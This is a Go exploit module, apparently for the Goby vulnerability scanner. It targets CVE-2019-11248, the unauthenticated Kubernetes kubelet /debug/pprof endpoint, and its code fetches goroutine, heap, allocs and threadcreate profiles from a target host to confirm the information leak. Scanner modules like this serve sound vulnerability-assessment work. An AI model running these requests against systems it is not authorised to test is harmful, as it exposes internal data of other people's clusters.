package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Google Kubernetes /debug/pprof/goroutine Information Disclosure Vulnerability（CVE-2019-11248）",
    "Description": "<p>Kubernetes(K8SQ) is a container cluster management system that Google opened source in 2014. It is used to deploy, scale, and manage containerized applications, with the goal of making deploying containerized applications simple and efficient. </p><p> The vulnerability exists before version 1.18.6 of Kubernetes and could lead to an unauthorized user access attack. The details of the vulnerability lie in the exposure of a debug endpoint (/debug/pprof) in the Kubelet component that can be accessed via an unauthorized Kubelethealthzi port.</p>",
    "Product": "Kubernetes",
    "Homepage": "https://kubernetes.io/",
    "DisclosureDate": "2019-04-17",
    "PostTime": "2024-07-10",
    "Author": "1215816861@qq.com",
    "FofaQuery": "body=\"debug/pprof\" && body=\"trace\"",
    "GobyQuery": "body=\"debug/pprof\" && body=\"trace\"",
    "Level": "0",
    "Impact": "<p>The vulnerability exists before version 1.18.6 of Kubernetes and could lead to an unauthorized user access attack. The details of the vulnerability lie in the exposure of a debug endpoint (/debug/pprof) in the Kubelet component that can be accessed via an unauthorized Kubelethealthzi port.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update intime:<a href=\"https://kubernetes.io/\">https://kubernetes.io/</a></p>",
    "References": [
        "https://blog.csdn.net/qq_37113223/article/details/135629246"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "allocs,heap,goroutine,threadcreate",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/debug/pprof/goroutine?debug=1",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
                    "Accept": "*/*",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                    "Priority": "u=4",
                    "Te": "trailers",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "github.com/",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/debug/pprof/goroutine?debug=1"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        "CVE-2019-11248"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "3.5",
    "Translation": {
        "CN": {
            "Name": "Google Kubernetes /debug/pprof/goroutine 信息泄露漏洞（CVE-2019-11248）",
            "Product": "Kubernetes",
            "Description": "<p>Kubernetes(简称K8SQ)是Google在2014年开源的一个容器集群管理系统。它用于容器化应用程序的部署、扩展和管理，目标是让部署容器化应用简单且高效。<br></p><p>漏洞存在于Kubernetes的1.18.6版本之前，可能导致未经授权的用户访问攻击。漏洞的细节在于Kubelet组件中存在一个调试端点(/debug/pprof)的暴露，该端点可以通过未经授权的Kubelethealthzi端口访问。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://kubernetes.io/\">https://kubernetes.io/</a><br></p>",
            "Impact": "<p>漏洞存在于Kubernetes的1.18.6版本之前，可能导致未经授权的用户访问攻击。漏洞的细节在于 Kubelet组件中存在一个调试端点(/debug/pprof)的暴露，该端点可以通过未经授权的Kubelet healthzi端口访问。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Google Kubernetes /debug/pprof/goroutine Information Disclosure Vulnerability（CVE-2019-11248）",
            "Product": "Kubernetes",
            "Description": "<p>Kubernetes(K8SQ) is a container cluster management system that Google opened source in 2014. It is used to deploy, scale, and manage containerized applications, with the goal of making deploying containerized applications simple and efficient.&nbsp;</p><p>&nbsp;The vulnerability exists before version 1.18.6 of Kubernetes and could lead to an unauthorized user access attack. The details of the vulnerability lie in the exposure of a debug endpoint (/debug/pprof) in the Kubelet component that can be accessed via an unauthorized Kubelethealthzi port.<br></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update intime:<a href=\"https://kubernetes.io/\">https://kubernetes.io/</a><br></p>",
            "Impact": "<p>The vulnerability exists before version 1.18.6 of Kubernetes and could lead to an unauthorized user access attack. The details of the vulnerability lie in the exposure of a debug endpoint (/debug/pprof) in the Kubelet component that can be accessed via an unauthorized Kubelethealthzi port.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10969"
}`

	postOrGet_8HV09JxyK8X7oxyVCxkhjUd2ldshqJ8v := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}
		if fileUrl == "" {
			fileUrl = "/debug/pprof/goroutine?debug=1"
		}

		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Content-Length":  "636",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"Connection":      "close",
			"Content-Type":    "application/x-www-form-urlencoded",
			"Sl-Ce-Suid":      "29",
			"Accept-Encoding": "gzip, deflate, br",
		}
		resp, err := setGetRequest(hostInfo, fileUrl, header)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}
		respTxt := resp.RawBody

		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/debug/pprof/goroutine?debug=1"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/debug/pprof/goroutine?debug=1": "github.com/"}
			// 函数继承
			uploadFileFunc := postOrGet_8HV09JxyK8X7oxyVCxkhjUd2ldshqJ8v

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"allocs":       {"/debug/pprof/allocs?debug=1", "github.com/"},
				"heap":         {"/debug/pprof/heap?debug=1", "github.com/"},
				"goroutine":    {"/debug/pprof/goroutine?debug=1", "github.com/"},
				"threadcreate": {"/debug/pprof/threadcreate?debug=1", "runtime."},
			}

			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_8HV09JxyK8X7oxyVCxkhjUd2ldshqJ8v

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = `请访问   "` + fileUrl + `"   获取详细信息`
			return expResult
		},
	))
}
